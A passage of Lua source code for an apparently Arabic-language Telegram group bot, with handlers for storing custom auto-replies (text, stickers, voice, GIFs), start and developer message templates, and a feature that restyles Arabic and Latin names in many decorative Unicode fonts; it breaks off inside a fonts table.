if tahadevstorm:get(DEVSTOR.."sudo:dev" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then tahadevstorm:del(DEVSTOR.."sudo:dev" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  local dev = text:match("(.*)") tahadevstorm:set(DEVSTOR.."dev", dev)  storm_sendMsg(msg.chat_id_, msg.id_, 1,'\n*📛¦* تم وضع كليشه المطور \n', 1, 'md')   storm_sendMsg(SUDO, 0, 1,'', 1, 'md') storm_sendMsg(SUDO, 0, 1,'', 1, 'md') end
if tahadevstorm:get(DEVSTOR.."start:msgofstart" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  tahadevstorm:del(DEVSTOR.."start:msgofstart" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   local msgofstart = text:match("(.*)")  tahadevstorm:set(DEVSTOR.."start:msgofstart1", msgofstart)  storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📛¦* تم وضع كليشه ستارت \n', 1, 'md')   end
if text  or data.message_.content_.sticker_ or data.message_.content_.voice_ or data.message_.content_.animation_ then  local test = tahadevstorm:get(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  if test == 'repp' then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*💠¦* تم حفظ الرد 📡", 1, 'md')  tahadevstorm:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  local test = tahadevstorm:get(DEVSTOR.."addreply2:"..msg.sender_user_id_..msg.chat_id_)  if data.message_.content_.sticker_ then   tahadevstorm:set(DEVSTOR.."addreply1:stekr"..test..msg.chat_id_, data.message_.content_.sticker_.sticker_.persistent_id_)  end   if data.message_.content_.voice_ then  tahadevstorm:set(DEVSTOR.."addreply1:vico"..test..msg.chat_id_, data.message_.content_.voice_.voice_.persistent_id_)  end   if data.message_.content_.animation_ then   tahadevstorm:set(DEVSTOR.."addreply1:gif"..test..msg.chat_id_, data.message_.content_.animation_.animation_.persistent_id_)  end  if text then   tahadevstorm:set(DEVSTOR.."taha:"..test..msg.chat_id_, text)  end  tahadevstorm:del(DEVSTOR.."addreply2:"..msg.sender_user_id_..msg.chat_id_)  return false  end  end
if text and msg.reply_to_message_id_ ~= 0 and not tahadevstorm:get(DEVSTOR..'lock:rep:rd'..msg.chat_id_) then  timstoop(c,6) local anemi = tahadevstorm:get(DEVSTOR.."addreply1:gif"..text..msg.chat_id_)   local veico = tahadevstorm:get(DEVSTOR.."addreply1:vico"..text..msg.chat_id_)   local stekr = tahadevstorm:get(DEVSTOR.."addreply1:stekr"..text..msg.chat_id_)     local taha = tahadevstorm:get(DEVSTOR.."taha:"..text..msg.chat_id_)   if taha then    storm_sendMsg(msg.chat_id_, msg.reply_to_message_id_, 1, ''..check_markdown(taha)..'', 1, 'md')     return false   end    if veico then    sendVoice(msg.chat_id_, msg.reply_to_message_id_, 0, 1, nil, veico)   return false   end    if stekr then    sendSticker(msg.chat_id_, msg.reply_to_message_id_, 0, 1, nil, stekr)   return false   end   if anemi then    sendDocument(msg.chat_id_, msg.reply_to_message_id_, 0, 1,nil, anemi)   return false   end   end
if text  or data.message_.content_.sticker_ or data.message_.content_.voice_ or data.message_.content_.animation_ then  local test = tahadevstorm:get(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  if test == 'repp' then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*💠¦* تم حفظ الرد 📡", 1, 'md')  tahadevstorm:del(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  local test = tahadevstorm:get(DEVSTOR.."add:reply2"..msg.sender_user_id_..msg.chat_id_)  if data.message_.content_.sticker_ then   tahadevstorm:set(DEVSTOR.."add:reply1:stekr"..test..msg.chat_id_, data.message_.content_.sticker_.sticker_.persistent_id_)  end   if data.message_.content_.voice_ then  tahadevstorm:set(DEVSTOR.."add:reply1:vico"..test..msg.chat_id_, data.message_.content_.voice_.voice_.persistent_id_)  end   if data.message_.content_.animation_ then   tahadevstorm:set(DEVSTOR.."add:reply1:gif"..test..msg.chat_id_, data.message_.content_.animation_.animation_.persistent_id_)  end  if text then   tahadevstorm:set(DEVSTOR.."add:reply:rd"..test..msg.chat_id_, text)  end  tahadevstorm:del(DEVSTOR.."add:reply2"..msg.sender_user_id_..msg.chat_id_)  return false  end  end
if text and not tahadevstorm:get(DEVSTOR..'lock:rep'..msg.chat_id_) then  timstoop(c,6) local anemi = tahadevstorm:get(DEVSTOR.."add:reply1:gif"..text..msg.chat_id_)   local veico = tahadevstorm:get(DEVSTOR.."add:reply1:vico"..text..msg.chat_id_)   local stekr = tahadevstorm:get(DEVSTOR.."add:reply1:stekr"..text..msg.chat_id_)     local taha = tahadevstorm:get(DEVSTOR.."add:reply:rd"..text..msg.chat_id_)   if taha then    storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..check_markdown(taha)..'', 1, 'md')     return false   end    if veico then    sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   return false   end    if stekr then    sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   return false   end   if anemi then    sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, anemi)   return false   end   end
if text  or (data.message_.content_.sticker_ or data.message_.content_.voice_ or data.message_.content_.animation_) then    local test = tahadevstorm:get(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    if test == 'yes1' then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ تم حفظ الرد بنجاح *", 1, 'md')    tahadevstorm:del(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    local test = tahadevstorm:get(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id)    if data.message_.content_.sticker_ then     tahadevstorm:set(DEVSTOR.."add:rep:tstekr:all"..test..bot_id, data.message_.content_.sticker_.sticker_.persistent_id_)    end     if data.message_.content_.voice_ then    tahadevstorm:set(DEVSTOR.."add:rep:tvico:all"..test..bot_id, data.message_.content_.voice_.voice_.persistent_id_)    end     if data.message_.content_.animation_ then     tahadevstorm:set(DEVSTOR.."add:repallt:gif:all"..test..bot_id, data.message_.content_.animation_.animation_.persistent_id_)    end    if text then     tahadevstorm:set(DEVSTOR.."add:rep:text:all"..test..bot_id, text)    end    tahadevstorm:del(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id)    return false    end    end
if text and not tahadevstorm:get(DEVSTOR..'lock:rep:all'..bot_id) then    timstoop(c,6) local anemi = tahadevstorm:get(DEVSTOR.."add:repallt:gif:all"..text..bot_id)    local veico = tahadevstorm:get(DEVSTOR.."add:rep:tvico:all"..text..bot_id)    local stekr = tahadevstorm:get(DEVSTOR.."add:rep:tstekr:all"..text..bot_id)      local taha = tahadevstorm:get(DEVSTOR.."add:rep:text:all"..text..bot_id)    if taha then     storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..check_markdown(taha)..'', 1, 'md')      return false    end     if veico then     sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)    return false    end     if stekr then     sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)    return false    end    if anemi then     sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, anemi)    return false    end    end
if text  or (data.message_.content_.sticker_ or data.message_.content_.voice_ or data.message_.content_.animation_) then    local test = tahadevstorm:get(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    if test == 'yes1' then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ تم حفظ الرد بنجاح *", 1, 'md')    tahadevstorm:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    local test = tahadevstorm:get(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id)    if data.message_.content_.sticker_ then     tahadevstorm:set(DEVSTOR.."add:rep:tstekr:all:rd"..test..bot_id, data.message_.content_.sticker_.sticker_.persistent_id_)    end     if data.message_.content_.voice_ then    tahadevstorm:set(DEVSTOR.."add:rep:tvico:all:rd"..test..bot_id, data.message_.content_.voice_.voice_.persistent_id_)    end     if data.message_.content_.animation_ then     tahadevstorm:set(DEVSTOR.."add:repallt:gif:all:rd"..test..bot_id, data.message_.content_.animation_.animation_.persistent_id_)    end    if text then     tahadevstorm:set(DEVSTOR.."add:rep:text:all:rd"..test..bot_id, text)    end    tahadevstorm:del(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id)    return false    end    end
if text and msg.reply_to_message_id_ ~= 0 and not tahadevstorm:get(DEVSTOR..'lock:rep:all:rd'..bot_id) then   timstoop(c,6)  local anemi = tahadevstorm:get(DEVSTOR.."add:repallt:gif:all:rd"..text..bot_id)    local veico = tahadevstorm:get(DEVSTOR.."add:rep:tvico:all:rd"..text..bot_id)    local stekr = tahadevstorm:get(DEVSTOR.."add:rep:tstekr:all:rd"..text..bot_id)      local taha = tahadevstorm:get(DEVSTOR.."add:rep:text:all:rd"..text..bot_id)    if taha then     storm_sendMsg(msg.chat_id_, msg.reply_to_message_id_, 1, ''..check_markdown(taha)..'', 1, 'md')      return false    end     if veico then     sendVoice(msg.chat_id_, msg.reply_to_message_id_, 0, 1, nil, veico)    return false    end     if stekr then     sendSticker(msg.chat_id_, msg.reply_to_message_id_, 0, 1, nil, stekr)    return false    end    if anemi then     sendDocument(msg.chat_id_, msg.reply_to_message_id_, 0, 1,nil, anemi)    return false    end    end    
if tahadevstorm:get(DEVSTOR.."skrafa:name" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then   local skr = text:match("(.*)")  tahadevstorm:del(DEVSTOR.."skrafa:name" .. msg.chat_id_ .. "" .. msg.sender_user_id_)     if not text:find('[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]') then tahask = skr local font_base = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  local font_hash = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  local fonts = {      "ضـٍہًہ,صًـٍـًہ,ـᓆـ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,ـפֿـ,ـפـ,ج,ش,ـωـ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظٍـً,طہـۛ,ز,ر,ـב,پ,ـפּـ,ڪٰྀہٰٰٖـ,گـ,ثِْْہٰٰہٰٰہٰٰـ,ژ,ذَِِِْ,آ,ئ,.,_",      "ضۜۜہٰٰ,صۛہُُِِٰٰۛہٰٰۛہٰٰ,قྀ̲ہٍٍٰٰٰٰٰྀ̲ہٰٰٰྀ̲ہٰٰٰ,ف͒ہِِٰٰٰٰ͒ہٰٰ͒ہٰٰ,غہِِِِٰٰٰٰہٰٰہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہّّٰٰٰ̐ہٰ̐ہ,حہٌٌٰٰٰٰہٰٰہٰٰ,جًًِِّّْْْۧۧۧ,شِٰہََُُِٰٰٰہِٰٰٰہٰٰ,سٌٌٍٍٰٰٰٰٰٰٓٓٓ,ی,بّہٌٌِِّٰٰہّہ,لْْٰٰ,آ,نَِٰہٍٍَِٰٰٰہَِٰہ,تَہََّّٰٰٰہََٰہَٰ,مٰ̲ہٍٍٰٰٰ̲ہٰ̲ہ,چ,ظۗہََِِْْٰٰۗہٰٰۗہٰٰ,طۨہََُُِِٰٰۨہٰٰۨہٰٰ,زًًَََََ,رِِٰٰ,دِِٰٰ,پ,وٍٍِِِّّ,ڪٰྀہٰٰٖ,گ,ثہِِْْْْٰٰہٰٰہٰٰ,ژ,ذََِِِْْ,ئ,آ,.,_",      "ضــ,صــ,قــ,فــ,غــ,عــ,ـهــ,خــ,حــ,جــ,شــ, سـ,یــ,بــ,لــ,ﺂ,نــ,تــ,مــ,چــ,ظــ,طــ,ـز,ـر,ـد,پــ,ـو,کــ,گــ,ـثــ,ـژ,ـذ,ﺂ,ئ,.,_",        "ضۜہٰٰ,صۛہٰٰ,قྀ̲ہٰٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہ,حہٰٰ,جْۧ,شِٰہٰٰ,سٰٰٓ,ی,بّہ,ل,آ,نَِٰہ,تَہَٰ,مٰ̲ہ,چ,ظۗہٰٰ,طۨہٰٰ,زَ,ر,د,پ,وِ,ک,گ,ثہٰٰ,ژ,ذِ,ئ,آ,.,_",      "ضًً,صــَ,ق,ف,غً,عـًً,هہـ,خِہ,ـحّ,جــٌ,ڜ,سُُُُُ,ی,بــِ,لـ,أ,نــہٰ⇣ـ,ِِتً,مہـً,چ,ظـَ,ط,ز,ر,د,پ,وُ,ﮏ,گ,ثـ͜͡ہــِ,ژ,ذ,ئ,أ  ,.,_",      "ضًـٍـًہًـٍـًہ,صًـٍـًہ,ق,ف,غً,عً,هہـ,خِہ,ב,,جـﮩ๋͜ﮧـ͜ާْ,ڜـ͜ާ,سـّــً,ی,بہ,لـﮩﮨہٰٰہٰ,أ,טּ,تہٍِۣـّ̐ہٰ,مہ,چ,ظٍـًہ,ط,ز,ر,د,پ,وُ,ڪـ,گ,ثہـٰ̲ہٰٰ,ژ,ذ,ئ,أ  ,.,_",      "ض,ص,ق,ف,غـ͜ﮩ͞ـ,عـ͜ﮩ͞ـ,هہـۛ,خہـۛ,ﺣہـۛ,جہـۛ,شۖہـۛ,سۜہـۛ,ی,بـ,ل,اآ,نہـۛ,تـ͜ﮩ͞ـ,مہـۛ,چ,ظـ͜ـ,طہـۛ,ز,ر,د,پ,ؤ,كـ͜ﮩ,گ,ثۨہـۛ,ژ,ذ,ئ,اآ  ,.,_",      "ضـ͜,صـ,ق,فـ͜ـ,غہۛـۛ,عۛـۛ,ه๋͜‏ـ,خ,ح,ج,شـ͜ﮩ͞ـ,سـ͜ﮩ͞ـ,ی,ﯧـۛ,لـۛ,اآ,نـ͜ـ,ت,م͜͞ـ,چ,ظـۛ,ط๋͜‏ـ,ز,ر,د,پ,وُ,كـهـۛ,گ,ث,ژ,ذ,ئ,اآ  ,.,_",      "ض๋͜‏ـۣۛ,صـ๋͜‏ـۣۛ,قـ,فـ๋͜‏ـۣۛ,غـ๋͜‏ـۣۛـ,عـ๋͜‏ـ,ه,خـ๋͜‏ـۣ,حـ๋͜‏ـ,,جـ๋͜‏ـ,شـ๋͜‏ـ,سـ๋͜‏ـ,ی,بہ,ل,أ,ن,تـ๋͜‏ـ,م,چ,ظـ๋͜‏ـ,ط,ز,ر,د,پ,و,كـ๋͜‏ـ,گ,ثہ,ژ,ذ,ئ,أ  ,.,_",      "ض,ص,ق,ف,غ,ع,هـ͜ﮩ͞ـ,خ,ح,ج,ش,س,ی,ب,لـّﮩ๋͜‏ـ,آ,نہٰٰ,ྀ̲تہٰٰ,مـّﮩ๋͜‏ـ,چ,طـྀ̲͜ہٰٰ,طـ͜ﮩ͞ـ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      "ض,صۛہٰٰ,قྀ̲ہٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,خٰ̐ہ,حہٰٰ,جْہ,شِٰہٰٰ,سٰٓہ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظہٰٰྀ̲,طہٰٰ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      "ض,صـﮩ๋͜‏ـ,قـﮩ๋͜‏ـ,فـﮩ๋͜‏ـ,غـﮩ๋͜‏ـ,؏ـﮩ๋͜‏ـ,هـﮩ๋͜‏ـ,خـﮩ๋͜‏ـ,حـﮩ๋͜‏ـ,جـﮩ๋͜‏ـ,شـﮩ๋͜‏ـ,سـﮩ๋͜‏ـ,ی,بـﮩ๋͜‏ـ,لّۣۗ,آِ,نْۛ,تٌۙ,ﻡِۙـ,چ,ظـﮩ๋͜‏ـۖۜ,طٌۗ,ﺯۖ,ږۙ,ڊْ,پ,ﯠۚ,ڪٌۘ,گ,ثٌّۜ,ژ,ﺫۗ,ئ,آِ  ,.,_",      "ض,صـ᷈͟ـ,قـ᷈͟ـ,فـ᷈͟ـ,غـ᷈͟ـ,عـ᷈͟ـ,هـ᷈͟ـ,خـ᷈͟ـ,حـ᷈͟ـ,جـ᷈͟ـ,شـ᷈͟ـ,سـ᷈͟ـ,ی,بـ᷈͟ـ,لـ᷈͟ـ,ٲآٲ,نـ᷈͟ـ,تـ᷈͟ـ,مـ᷈͟ـ,چ,ظـ᷈͟ــ᷈͟ـ,طـ᷈͟ـ,ز,ر,د,پ,ﯠ,كـ᷈͟ـ,گ,ثـ᷈͟ـ,ژ,ذ,ئ,ٲآٲ  ,.,_",      "ض,صـﮩ⃑ﮩ,قـﮩ⃑ﮩ,فـﮩ⃑ﮩ,غـﮩ⃑ﮩ,عـﮩ⃑ﮩ,هـﮩ⃑ﮩ,خـﮩ⃑ﮩ,حـﮩ⃑ﮩ,جـﮩ⃑ﮩ,شـﮩ⃑ﮩ,سـﮩ⃑ﮩ,ی,بـﮩ⃑ﮩ,لـﮩ⃑ﮩ,آ,نـﮩ⃑ﮩ,تـﮩ⃑ﮩ,مـﮩ⃑ﮩ,چ,ظـﮩ⃑ﮩـﮩ⃑ﮩ,طـﮩ⃑ﮩ,ڒ,ر,ډ,پ,ﯛ,كـﮩ⃑ﮩ,گ,ثـﮩ⃑ﮩ,ژ,ﮈ,ئ,آ  ,.,_",      "ضًـٍـًہ,صًـ,ـقـ,ف,غً,عًـ,هہ,خِہ,حـ,جْـ,ڜـ,ڛً,ی,بہ,ل,آ,ہن,تہ,م,چ,ظٍـً,طٍـًہ,ز,ڑ,دٍ,پ,وُ,ـڪـ,گ,ثـ,ژ,ذٍ,ئ,آ  ,.,_",      "ضہۣۗ,صہۣۗ,قَہۣۗـ,فُہۣۗ,غّہۣۗ,عَہۣۗ,هہۣۗ,خٌہۣۗ,حًہۣۗ,جَہۣۗ,شّہۣۗ,سہۣۗـ,ی,بّہۣۗـ,لًً,أ,نٌہۣۗـ,تُہۣۗ,مہۣۗ,چ,ظٌہۣۗ,طٌہۣۗـ,زُ,رُ,دُ,پ,وِ,كہۣۗ,گ,ثًہۣۗ,ژ,ذٌ,ئ,أ  ,.,_",      "ض,صۭۣۣۖـ,قۭۣۣۖـ,فۭۣۣۖـ,غۭۣۣۖـ,غۭۣۣۖـ,هۭۣۣۖـ,خۭۣۣۖـ,حۭۣۣۖـ,جۭۣۣۖـ,شۭۣۣۖـ,سۭۣۣۖـ,ی,بۭۣۣۖـ,لۭۣۣۖـ,آ,نۭۣۣۖـ,تۭۣۣۖـ,مۭۣۣۖـ,چ,ظۭۣۣۖـۭۣۣۖـ,طۭۣۣۖـ,ز,ر,د,پ,ﯠ,كۭۣۣۖـ,گ,ثۭۣۣۖـ,ژ,ذ,ئ,آ  ,.,_",      "ض,صـﮩـ,قـﮩـ,فـﮩـ,غـﮩـ,عـﮩـ,هـﮩـ,خـﮩـ,حـﮩـ,جـﮩـ,شـﮩـ,سـﮩـ,ی,بـﮩـ,لـﮩـ,ٲ,نـﮩـ,تـﮩـ,مـﮩـ,چ,ظـﮩــﮩـ,طـﮩـ,ز,ر,د,پ,و,ګ,گ,ثـﮩـ,ژ,ذ,ئ,ٲ,.,_",      "ض,صـٰٰـۛۛۛ,قـٰٰـۛۛۛ,فـٰٰـۛۛۛ,غـٰٰـۛۛۛ,عـٰٰـۛۛۛ,هـٰٰـۛۛۛ,خـٰٰـۛۛۛ,حـٰٰـۛۛۛ,جـٰٰـۛۛۛ,شـٰٰـۛۛۛ,سـٰٰـۛۛۛ,ی,بـٰٰـۛۛۛ,لـٰٰـۛۛۛ,أ,نـٰٰـۛۛۛ,تـٰٰـۛۛۛ,مـٰٰـۛۛۛ,چ,ظـٰٰـۛۛۛـٰٰـۛۛۛ,طـٰٰـۛۛۛ,ز,ر,د,پ,و,ک,گ,ثـٰٰـۛۛۛ,ژ,ذ,ئ,أ  ,.,_",      "ض,صـٰ۫ﹻ,قـٰ۫ﹻ,فـٰ۫ﹻ,غـٰ۫ﹻ,عـٰ۫ﹻ,هـٰ۫ﹻ,خـٰ۫ﹻ,حـٰ۫ﹻ,جـٰ۫ﹻ,شـٰ۫ﹻ,سـٰ۫ﹻ,ی,بـٰ۫ﹻ,لـٰ۫ﹻ,ٱ,نَـٰ۫ﹻ,تْـٰ۫ﹻ,مٌـٰ۫ﹻ,چ,ظٌـٰ۫ﹻـٰ۫ﹻ,طِـٰ۫ﹻ,زُ,رَ,دِ,پ,وَ,كِـٰ۫ﹻ,گ,ثُـٰ۫ﹻ,ژ,ذَ,ئ,ٱℓ  ,.,_",      "ض,صہٰـ͢͡,قہٰـ͢͡,فہٰـ͢͡,غہٰـ͢͡,عہٰـ͢͡,هہٰـ͢͡,خہٰـ͢͡,حہٰـ͢͡,جہٰـ͢͡,شہٰـ͢͡,سہٰـ͢͡,ی,بہٰـ͢͡,لہٰـ͢͡,ا,نہٰـ͢͡,تہٰـ͢͡,مہٰـ͢͡,چ,ظہٰـ͢͡ہٰـ͢͡,طہٰـ͢͡,ز,ر,د,پ,و,كہٰـ͢͡,گ,ثہٰـ͢͡,ژ,ذ,ئ,ا  ,.,_",       }  local result = {}   i=0   for k=1,#fonts do   i=i+1   local tar_font = fonts[i]:split(",")   local text = tahask   local text = text:gsub("ض",tar_font[1])     local text = text:gsub("ص",tar_font[2])     local text = text:gsub("ق",tar_font[3])     local text = text:gsub("ف",tar_font[4])     local text = text:gsub("غ",tar_font[5])     local text = text:gsub("ع",tar_font[6])     local text = text:gsub("ه",tar_font[7])     local text = text:gsub("خ",tar_font[8])     local text = text:gsub("ح",tar_font[9])     local text = text:gsub("ج",tar_font[10])     local text = text:gsub("ش",tar_font[11])     local text = text:gsub("س",tar_font[12])     local text = text:gsub("ی",tar_font[13])     local text = text:gsub("ب",tar_font[14])     local text = text:gsub("ل",tar_font[15])     local text = text:gsub("ا",tar_font[16])     local text = text:gsub("ن",tar_font[17])     local text = text:gsub("ت",tar_font[18])     local text = text:gsub("م",tar_font[19])     local text = text:gsub("چ",tar_font[20])     local text = text:gsub("ظ",tar_font[21])     local text = text:gsub("ط",tar_font[22])     local text = text:gsub("ز",tar_font[23])     local text = text:gsub("ر",tar_font[24])     local text = text:gsub("د",tar_font[25])     local text = text:gsub("پ",tar_font[26])     local text = text:gsub("و",tar_font[27])     local text = text:gsub("ک",tar_font[28])     local text = text:gsub("گ",tar_font[29])     local text = text:gsub("ث",tar_font[30])     local text = text:gsub("ژ",tar_font[31])     local text = text:gsub("ذ",tar_font[32])     local text = text:gsub("ئ",tar_font[33])     local text = text:gsub("آ",tar_font[34])      table.insert(result, text)   end   local result_text = "*📝¦ الكلمه ◖"..tahask.."◗*\n*📛¦ عدد انواع الزخرفه ◖"..tostring(#fonts).."◗*\n——————༻📛༺——————\n"   a=0   for v=1,#result do   a=a+1   local ta = { ' •🔥✨ ', '🔅🔥﴿', '•  ❥˓  ', '💝﴿ֆ', ' • 🐼🌿', ' •🙊💙', '-🐥✨ ', ' 〄😻‘',' ⚡️', '- ⁽🌷', '🔥“', '💭', '', '🎩🍿','“̯ 🐼💗 ', '🐝🍷','❥̚͢₎ 🐣', '👄‘', ' 💭ۦ', ' 💛💭ۦ', ' ⚡️ۦ','℡ᴖ̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ ✨🐯⇣✦', '⁞♩⁽💎🌩₎⇣✿','ۦٰ‏┋❥ ͢˓🦁💛ۦ‏', '⚡️♛ֆ₎', '♛⇣🐰☄️₎✦', '⁾⇣✿💖┊❥', ' ₎✿🎃 ⁞“❥', '😴✿⇣', '❥┊⁽ ℡🦁' }   result_text = result_text..'*◖'..a.."◗* `"..result[a]..''..ta[math.random(#ta)].."`\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n"   end storm_sendMsg(msg.chat_id_, 0, 1, result_text, 1, 'md') end end 
if tahadevstorm:get(DEVSTOR.."skrafa:namen" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then       local skr = text:match("(.*)")       tahadevstorm:del(DEVSTOR.."skrafa:namen" .. msg.chat_id_ .. "" .. msg.sender_user_id_)         if not text:find("[\216-\219][\128-\191]") then      tahask = skr     local font_base = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_"     local font_hash = "z,y,x,w,v,u,t,s,r,q,p,o,n,m,l,k,j,i,h,g,f,e,d,c,b,a,Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A,0,1,2,3,4,5,6,7,8,9,.,_"     local fonts = {            "Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1  ,.,_",     "Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,0,9,8,7,6,5,4,3,2,1  ,.,_",     "Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1,.,_",     "п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐,к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,0,9,8,7,6,5,4,3,2,1,.,_",     "ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     "Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,0,9,8,7,6,5,4,3,2,1,.,_",     